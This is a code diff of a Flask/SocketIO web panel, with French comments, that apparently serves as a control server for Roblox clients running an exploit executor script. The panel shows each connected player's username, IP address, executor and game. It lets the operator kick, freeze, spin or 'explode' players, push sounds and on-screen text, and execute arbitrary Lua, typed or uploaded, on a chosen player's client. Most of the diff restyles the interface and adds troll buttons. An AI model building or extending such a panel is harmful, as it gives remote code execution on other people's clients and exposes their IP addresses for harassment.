@@ -19,7 +19,6 @@ pending_kicks = {}
 pending_commands = {}
 history_log = []
 
-# === Chargement / sauvegarde historique ===
 def load_history():
     global history_log
     if os.path.exists(HISTORY_FILE):
@@ -36,7 +35,6 @@ def save_history():
     except:
         pass
 
-# === Sécurité IP ===
 def check_ip():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     if ip and "," in ip:
@@ -74,7 +72,6 @@ def add_history(event_type, username, details=""):
     save_history()
     socketio.emit("history_update", {"history": history_log[:50]})
 
-# === NOUVEAU HTML MODERNE BLEU CIEL (style Wave) ===
 HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
@@ -92,56 +89,51 @@ HTML = """<!DOCTYPE html>
         --text: #e2e8f0;
         --text-muted: #94a3b8;
         --danger: #ef4444;
-        --success: #10b981;
     }
     * { margin:0; padding:0; box-sizing:border-box; }
     body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; display: flex; }
-    .header { position: fixed; top: 0; left: 0; right: 0; height: 70px; background: rgba(15,23,42,0.95); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); z-index: 1000; display: flex; align-items: center; padding: 0 2rem; justify-content: space-between; }
-    .logo { display: flex; align-items: center; gap: 12px; font-weight: 700; font-size: 1.5rem; }
-    .logo svg { width: 40px; height: 40px; fill: var(--primary); }
-    .stats { font-size: 1.1rem; color: var(--text-muted); }
-    .stats b { color: var(--primary); font-weight: 600; }
-    .main { flex: 1; margin-top: 70px; display: flex; }
-    .sidebar { width: 260px; background: rgba(30,41,59,0.95); border-right: 1px solid var(--border); padding: 1.5rem 0; }
-    .nav-item { padding: 1rem 2rem; cursor: pointer; transition: all 0.3s; color: var(--text-muted); font-weight: 500; }
-    .nav-item:hover { background: rgba(6,182,212,0.1); color: var(--primary); }
-    .nav-item.active { background: rgba(6,182,212,0.2); color: var(--primary); border-left: 4px solid var(--primary); }
-    .content { flex: 1; padding: 2rem; overflow-y: auto; }
-    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 1.5rem; }
-    .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 1.5rem; transition: all 0.4s; position: relative; overflow: hidden; }
-    .card:hover { transform: translateY(-8px); box-shadow: 0 20px 40px rgba(6,182,212,0.15); border-color: var(--primary); }
-    .card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: linear-gradient(90deg, transparent, var(--primary), transparent); opacity: 0; transition: opacity 0.4s; }
-    .card:hover::before { opacity: 1; }
-    .status { display: flex; align-items: center; gap: 8px; margin-bottom: 12px; }
-    .dot { width: 10px; height: 10px; border-radius: 50%; background: #ef4444; box-shadow: 0 0 10px #ef444430; }
-    .dot.online { background: var(--primary); box-shadow: 0 0 20px var(--primary); animation: pulse 2s infinite; }
-    @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.7; } }
-    .name { font-size: 1.3rem; font-weight: 600; margin-bottom: 8px; }
-    .name a { color: var(--primary); text-decoration: none; }
-    .name a:hover { text-decoration: underline; }
-    .info { font-size: 0.9rem; color: var(--text-muted); line-height: 1.5; margin-bottom: 16px; }
-    .btn-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin: 12px 0; }
-    .btn { padding: 10px; border: none; border-radius: 10px; font-weight: 600; font-size: 0.8rem; cursor: pointer; transition: all 0.3s; color: white; }
-    .btn:hover { transform: translateY(-2px); }
-    .btn.kick { background: linear-gradient(45deg, #ef4444, #dc2626); }
-    .btn.freeze { background: linear-gradient(45deg, #8b5cf6, #7c3aed); }
-    .btn.spin { background: linear-gradient(45deg, #06b6d4, #0891b2); }
-    .btn.lua { background: linear-gradient(45deg, #10b981, #059669); }
-    .btn.sound { background: linear-gradient(45deg, #f59e0b, #d97706); }
-    .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 2000; align-items: center; justify-content: center; }
-    .modal.active { display: flex; }
-    .modal-content { background: var(--card); border: 1px solid var(--border); border-radius: 16px; width: 90%; max-width: 500px; padding: 2rem; box-shadow: 0 20px 60px rgba(6,182,212,0.3); }
-    .modal-content h2 { color: var(--primary); margin-bottom: 1rem; text-align: center; font-size: 1.5rem; }
-    input, textarea { width: 100%; padding: 14px; background: #0f172a; border: 1px solid var(--border); border-radius: 12px; color: white; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; }
-    .modal-buttons { display: flex; gap: 1rem; }
-    .modal-btn { flex: 1; padding: 14px; border: none; border-radius: 12px; font-weight: 600; cursor: pointer; transition: all 0.3s; }
-    .confirm { background: var(--primary); color: white; }
-    .confirm:hover { background: var(--primary-hover); transform: translateY(-2px); }
-    .cancel { background: #475569; color: white; }
-    .toast-container { position: fixed; bottom: 20px; right: 20px; z-index: 9999; }
-    .toast { background: var(--card); border-left: 5px solid var(--primary); padding: 1rem 1.5rem; margin-top: 1rem; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); animation: slideIn 0.4s; }
-    @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
-    .history-item { background: var(--card); padding: 1rem; border-radius: 12px; margin-bottom: 1rem; border-left: 4px solid var(--primary); }
+    .header { position:fixed;top:0;left:0;right:0;height:70px;background:rgba(15,23,42,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);z-index:1000;display:flex;align-items:center;padding:0 2rem;justify-content:space-between; }
+    .logo { display:flex;align-items:center;gap:12px;font-weight:700;font-size:1.5rem; }
+    .logo svg { width:40px;height:40px;fill:var(--primary); }
+    .stats { font-size:1.1rem;color:var(--text-muted); }
+    .stats b { color:var(--primary);font-weight:600; }
+    .main { flex:1;margin-top:70px;display:flex; }
+    .sidebar { width:260px;background:rgba(30,41,59,0.95);border-right:1px solid var(--border);padding:1.5rem 0; }
+    .nav-item { padding:1rem 2rem;cursor:pointer;transition:all 0.3s;color:var(--text-muted);font-weight:500; }
+    .nav-item:hover { background:rgba(6,182,212,0.1);color:var(--primary); }
+    .nav-item.active { background:rgba(6,182,212,0.2);color:var(--primary);border-left:4px solid var(--primary); }
+    .content { flex:1;padding:2rem;overflow-y:auto; }
+    .grid { display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:1.5rem; }
+    .card { background:var(--card);border:1px solid var(--border);border-radius:16px;padding:1.5rem;transition:all 0.4s;position:relative;overflow:hidden; }
+    .card:hover { transform:translateY(-8px);box-shadow:0 20px 40px rgba(6,182,212,0.2);border-color:var(--primary); }
+    .card::before { content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,transparent,var(--primary),transparent);opacity:0;transition:0.4s; }
+    .card:hover::before { opacity:1; }
+    .status { display:flex;align-items:center;gap:8px;margin-bottom:12px; }
+    .dot { width:10px;height:10px;border-radius:50%;background:#ef4444;box-shadow:0 0 10px #ef444430; }
+    .dot.online { background:var(--primary);box-shadow:0 0 20px var(--primary);animation:pulse 2s infinite; }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.7} }
+    .name { font-size:1.3rem;font-weight:600;margin-bottom:8px; }
+    .name a { color:var(--primary);text-decoration:none; }
+    .name a:hover { text-decoration:underline; }
+    .info { font-size:0.9rem;color:var(--text-muted);line-height:1.5;margin-bottom:16px; }
+    .category { font-weight:bold;color:var(--primary);margin:16px 0 8px;font-size:0.95rem; }
+    .btn-grid { display:grid;grid-template-columns:repeat(3,1fr);gap:8px; }
+    .btn { padding:10px;border:none;border-radius:10px;font-weight:600;font-size:0.8rem;cursor:pointer;transition:all 0.3s;color:white; }
+    .btn:hover { transform:translateY(-3px);box-shadow:0 8px 20px rgba(0,0,0,0.4); }
+    .modal { display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:2000;align-items:center;justify-content:center; }
+    .modal.active { display:flex; }
+    .modal-content { background:var(--card);border:1px solid var(--border);border-radius:16px;width:90%;max-width:520px;padding:2rem;box-shadow:0 30px 80px rgba(6,182,212,0.4); }
+    .modal-content h2 { color:var(--primary);margin-bottom:1rem;text-align:center;font-size:1.6rem; }
+    input, textarea { width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-family:'JetBrains Mono',monospace; }
+    .modal-buttons { display:flex;gap:1rem; }
+    .modal-btn { flex:1;padding:14px;border:none;border-radius:12px;font-weight:600;cursor:pointer;transition:all 0.3s; }
+    .confirm { background:var(--primary);color:white; }
+    .confirm:hover { background:var(--primary-hover);transform:translateY(-3px); }
+    .cancel { background:#475569;color:white; }
+    .toast-container { position:fixed;bottom:20px;right:20px;z-index:9999; }
+    .toast { background:var(--card);border-left:5px solid var(--primary);padding:1rem 1.5rem;margin-top:1rem;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.6);animation:slideIn 0.4s; }
+    @keyframes slideIn { from{transform:translateX(100%)} to{transform:translateX(0)} }
+    .history-item { background:var(--card);padding:1rem;border-radius:12px;margin-bottom:1rem;border-left:4px solid var(--primary); }
 </style>
 </head>
 <body>
@@ -170,61 +162,22 @@ HTML = """<!DOCTYPE html>
     </div>
 </div>
 
-<!-- Modals -->
-<div class="modal" id="kickModal"><div class="modal-content">
-    <h2>Kick Player</h2>
-    <input type="text" id="kickReason" placeholder="Reason (optional)" autofocus>
-    <div class="modal-buttons">
-        <button class="modal-btn cancel" id="cancelKick">Cancel</button>
-        <button class="modal-btn confirm" id="confirmKick">Kick</button>
-    </div>
-</div></div>
-
-<div class="modal" id="playSoundModal"><div class="modal-content">
-    <h2>Play Sound</h2>
-    <input type="text" id="soundAssetId" placeholder="Asset ID">
-    <div class="modal-buttons">
-        <button class="modal-btn cancel" id="cancelSound">Cancel</button>
-        <button class="modal-btn confirm" id="confirmSound">Play</button>
-    </div>
-</div></div>
-
-<div class="modal" id="textScreenModal"><div class="modal-content">
-    <h2>Text Screen</h2>
-    <input type="text" id="screenText" placeholder="Text to display">
-    <div class="modal-buttons">
-        <button class="modal-btn cancel" id="cancelText">Cancel</button>
-        <button class="modal-btn confirm" id="confirmText">Show</button>
-    </div>
-</div></div>
-
-<div class="modal" id="luaExecModal"><div class="modal-content">
-    <h2>Execute Lua</h2>
-    <textarea id="luaScript" placeholder="Lua code..." style="height:180px;"></textarea>
-    <div class="modal-buttons">
-        <button class="modal-btn cancel" id="cancelLua">Cancel</button>
-        <button class="modal-btn confirm" id="confirmLua">Execute</button>
-    </div>
-</div></div>
-
-<div class="modal" id="importFileModal"><div class="modal-content">
-    <h2>Import Lua File</h2>
-    <input type="file" id="luaFileInput" accept=".lua,.txt" style="padding:1rem;background:#0f172a;border:2px dashed var(--primary);border-radius:12px;cursor:pointer;">
-    <div class="modal-buttons">
-        <button class="modal-btn cancel" id="cancelImport">Cancel</button>
-        <button class="modal-btn confirm" id="confirmImport">Execute File</button>
-    </div>
-</div></div>
+<!-- Tous les modals (inchangés) -->
+<div class="modal" id="kickModal"><div class="modal-content"><h2>Kick Player</h2><input type="text" id="kickReason" placeholder="Reason (optional)" autofocus><div class="modal-buttons"><button class="modal-btn cancel" id="cancelKick">Cancel</button><button class="modal-btn confirm" id="confirmKick">Confirm Kick</button></div></div></div>
+<div class="modal" id="playSoundModal"><div class="modal-content"><h2>Play Sound</h2><input type="text" id="soundAssetId" placeholder="Enter Asset ID" autofocus><div class="modal-buttons"><button class="modal-btn cancel" id="cancelSound">Cancel</button><button class="modal-btn confirm" id="confirmSound">Play</button></div></div></div>
+<div class="modal" id="textScreenModal"><div class="modal-content"><h2>Display Text Screen</h2><input type="text" id="screenText" placeholder="Enter text" autofocus><div class="modal-buttons"><button class="modal-btn cancel" id="cancelText">Cancel</button><button class="modal-btn confirm" id="confirmText">Display</button></div></div></div>
+<div class="modal" id="luaExecModal"><div class="modal-content"><h2>Execute Lua Script</h2><textarea id="luaScript" placeholder="Enter Lua code" style="height:180px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel" id="cancelLua">Cancel</button><button class="modal-btn confirm" id="confirmLua">Execute</button></div></div></div>
+<div class="modal" id="importFileModal"><div class="modal-content"><h2>Import Lua File</h2><input type="file" id="luaFileInput" accept=".lua,.txt" style="padding:1rem;background:#0f172a;border:2px dashed var(--primary);border-radius:12px;cursor:pointer;"><div class="modal-buttons"><button class="modal-btn cancel" id="cancelImport">Cancel</button><button class="modal-btn confirm" id="confirmImport">Execute File</button></div></div></div>
 
 <div class="toast-container" id="toasts"></div>
 
 <script>
 const socket = io();
-let currentId = null;
+let currentKickId = null, currentSoundId = null, currentTextId = null, currentLuaId = null, currentImportId = null;
 
 function switchTab(tab) {
     document.querySelectorAll('.tab').forEach(t => t.style.display = 'none');
-    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+    document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
     document.getElementById(tab + '-tab').style.display = 'block';
     event.target.classList.add('active');
 }
@@ -238,61 +191,65 @@ function toast(msg, type = "info") {
     setTimeout(() => t.remove(), 5000);
 }
 
-function openModal(modalId, id) { currentId = id; document.getElementById(modalId).classList.add('active'); }
-function closeModal(modalId) { document.getElementById(modalId).classList.remove('active'); currentId = null; }
+// Modals
+function openKickModal(id) { currentKickId = id; document.getElementById("kickModal").classList.add("active"); document.getElementById("kickReason").focus(); }
+function openPlaySoundModal(id) { currentSoundId = id; document.getElementById("playSoundModal").classList.add("active"); document.getElementById("soundAssetId").focus(); }
+function openTextScreenModal(id) { currentTextId = id; document.getElementById("textScreenModal").classList.add("active"); document.getElementById("screenText").focus(); }
+function openLuaExecModal(id) { currentLuaId = id; document.getElementById("luaExecModal").classList.add("active"); document.getElementById("luaScript").focus(); }
+function openImportFileModal(id) { currentImportId = id; document.getElementById("importFileModal").classList.add("active"); }
+
+function closeModal(modalId) { document.getElementById(modalId).classList.remove("active"); }
+document.querySelectorAll('.cancel').forEach(b => b.onclick = () => closeModal(b.closest('.modal').id));
 
 function sendTroll(id, cmd, param = null) {
-    const data = { userid: id, cmd };
+    const body = {userid: id, cmd: cmd};
     if (param !== null) {
-        if (cmd === "playsound") data.assetId = param;
-        if (cmd === "textscreen") data.text = param;
-        if (cmd === "luaexec") data.script = param;
+        if (cmd === "playsound") body.assetId = param;
+        else if (cmd === "textscreen") body.text = param;
+        else if (cmd === "luaexec") body.script = param;
     }
-    fetch("/troll", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(data) });
+    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(body)});
     toast(cmd.toUpperCase() + " sent");
 }
 
+// Confirmations
 document.getElementById("confirmKick").onclick = () => {
-    const reason = document.getElementById("kickReason").value || "Kicked by admin";
-    fetch("/kick", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: currentId, reason}) });
-    toast("Player kicked", "danger");
+    const reason = document.getElementById("kickReason").value.trim() || "Kicked by admin";
+    fetch("/kick", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: currentKickId, reason})});
+    toast("KICK sent", "danger");
     closeModal("kickModal");
 };
-
 document.getElementById("confirmSound").onclick = () => {
     const asset = document.getElementById("soundAssetId").value.trim();
-    if (asset) sendTroll(currentId, "playsound", asset);
+    if (!asset) return toast("Enter Asset ID", "danger");
+    sendTroll(currentSoundId, "playsound", asset);
     closeModal("playSoundModal");
 };
-
 document.getElementById("confirmText").onclick = () => {
     const text = document.getElementById("screenText").value.trim();
-    if (text) sendTroll(currentId, "textscreen", text);
+    if (!text) return toast("Enter text", "danger");
+    sendTroll(currentTextId, "textscreen", text);
     closeModal("textScreenModal");
 };
-
 document.getElementById("confirmLua").onclick = () => {
     const script = document.getElementById("luaScript").value.trim();
-    if (script) sendTroll(currentId, "luaexec", script);
+    if (!script) return toast("Enter Lua code", "danger");
+    sendTroll(currentLuaId, "luaexec", script);
     closeModal("luaExecModal");
 };
-
 document.getElementById("confirmImport").onclick = () => {
     const file = document.getElementById("luaFileInput").files[0];
-    if (!file) return toast("No file selected", "danger");
+    if (!file) return toast("Select a file", "danger");
     const reader = new FileReader();
-    reader.onload = e => { sendTroll(currentId, "luaexec", e.target.result); closeModal("importFileModal"); };
+    reader.onload = e => { sendTroll(currentImportId, "luaexec", e.target.result); closeModal("importFileModal"); document.getElementById("luaFileInput").value = ""; };
     reader.readAsText(file);
 };
-
-document.querySelectorAll('.cancel').forEach(btn => {
-    btn.onclick = () => closeModal(btn.closest('.modal').id);
-});
 
 function render(data) {
     document.getElementById("stats").innerText = data.online;
     const grid = document.getElementById("players");
-    const current = new Set(Object.keys(data.players));
+    const currentIds = new Set(Object.keys(data.players));
+
     Object.entries(data.players).forEach(([id, p]) => {
         let card = document.getElementById(`card_${id}`);
         if (!card) {
@@ -302,22 +259,43 @@ function render(data) {
             grid.appendChild(card);
         }
         card.innerHTML = `
-            <div class="status"><div class="dot ${p.online ? 'online' : ''}"></div><span>${p.online ? 'Online' : 'Offline'}</span></div>
-            <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (${id})</div>
-            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: <a href="https://www.roblox.com/games/${p.gameId}" target="_blank">${p.game}</a></div>
+            <div class="status"><div class="dot ${p.online ? "online" : ""}"></div><span>${p.online ? "Online" : "Offline"}</span></div>
+            <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
+            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: <a href="https://www.roblox.com/games/${p.gameId}" target="_blank">${p.game}</a><br>JobId: ${p.jobId}</div>
+
+            <div class="category">TROLLS</div>
             <div class="btn-grid">
-                <button class="btn kick" onclick="openModal('kickModal','${id}')">KICK</button>
-                <button class="btn freeze" onclick="sendTroll('${id}','freeze')">FREEZE</button>
-                <button class="btn spin" onclick="sendTroll('${id}','spin')">SPIN</button>
-                <button class="btn" style="background:#f59e0b" onclick="openModal('playSoundModal','${id}')">SOUND</button>
-                <button class="btn" style="background:#06b6d4" onclick="openModal('textScreenModal','${id}')">TEXT</button>
-                <button class="btn lua" onclick="openModal('luaExecModal','${id}')">LUA</button>
-                <button class="btn lua" style="grid-column:span 3;background:#10b981" onclick="openModal('importFileModal','${id}')">IMPORT FILE</button>
+                <button class="btn" style="background:linear-gradient(45deg,#ef4444,#dc2626)" onclick="openKickModal('${id}')">KICK</button>
+                <button class="btn" style="background:linear-gradient(45deg,#8b5cf6,#7c3aed)" onclick="sendTroll('${id}','freeze')">FREEZE</button>
+                <button class="btn" style="background:linear-gradient(45deg,#06b6d4,#0891b2)" onclick="sendTroll('${id}','spin')">SPIN</button>
+                <button class="btn" style="background:linear-gradient(45deg,#ffff00,#aaaa00)" onclick="sendTroll('${id}','jump')">JUMP</button>
+                <button class="btn" style="background:linear-gradient(45deg,#88ff88,#55aa55)" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
+                <button class="btn" style="background:linear-gradient(45deg,#ff5555,#aa0000)" onclick="sendTroll('${id}','explode')">EXPLODE</button>
+                <button class="btn" style="background:linear-gradient(45deg,#5555ff,#0000aa)" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
+                <button class="btn" style="background:orange" onclick="openPlaySoundModal('${id}')">PLAY SOUND</button>
+                <button class="btn" style="background:linear-gradient(45deg,#00ffff,#00aaaa)" onclick="openTextScreenModal('${id}')">TEXT SCREEN</button>
+            </div>
+
+            <div class="category">UNDO</div>
+            <div class="btn-grid">
+                <button class="btn" style="background:#666" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
+                <button class="btn" style="background:#666" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
+                <button class="btn" style="background:#666" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
+                <button class="btn" style="background:#666" onclick="sendTroll('${id}','uninvisible')">VISIBLE</button>
+                <button class="btn" style="background:#666" onclick="sendTroll('${id}','stopsound')">STOP SOUND</button>
+                <button class="btn" style="background:#666" onclick="sendTroll('${id}','hidetext')">HIDE TEXT</button>
+            </div>
+
+            <div class="category">LUA EXEC</div>
+            <div class="btn-grid" style="grid-template-columns:1fr 1fr">
+                <button class="btn" style="background:linear-gradient(45deg,#00ff00,#00aa00)" onclick="openImportFileModal('${id}')">IMPORT FILE</button>
+                <button class="btn" style="background:linear-gradient(45deg,#ff00ff,#aa00aa)" onclick="openLuaExecModal('${id}')">EXECUTOR</button>
             </div>
         `;
     });
+
     document.querySelectorAll('.card').forEach(c => {
-        if (!current.has(c.id.replace('card_',''))) c.remove();
+        if (!currentIds.has(c.id.replace('card_', ''))) c.remove();
     });
 }
 
@@ -339,7 +317,7 @@ fetch("/get_history").then(r => r.json()).then(renderHistory);
 </body>
 </html>"""
 
-# === Routes (inchangées) ===
+# === Routes inchangées (identiques à ton code original) ===
 @app.route("/")
 def index():
     return render_template_string(HTML)
@@ -405,7 +383,7 @@ def troll():
     cmd = data.get("cmd", "")
     if uid and cmd:
         cmd_data = {"cmd": cmd}
-        details = cmd.upper()
+        details = f"{cmd.upper()}"
         if "assetId" in data:
             cmd_data["assetId"] = data["assetId"]
             details += f" (Asset: {data['assetId']})"
@@ -418,6 +396,7 @@ def troll():
         pending_commands[uid] = cmd_data
         name = connected_players.get(uid, {}).get("username", "Unknown")
         add_history("action", name, details)
+        socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
     return jsonify({"sent": True})
 
 def broadcast_loop():
@@ -437,6 +416,7 @@ def broadcast_loop():
         for uid in to_remove:
             username = connected_players.pop(uid, {}).get("username", "Unknown")
             add_history("disconnect", username, "Disconnected")
+            socketio.emit("status", {"username": username, "online": False})
         socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
         socketio.sleep(2)
 
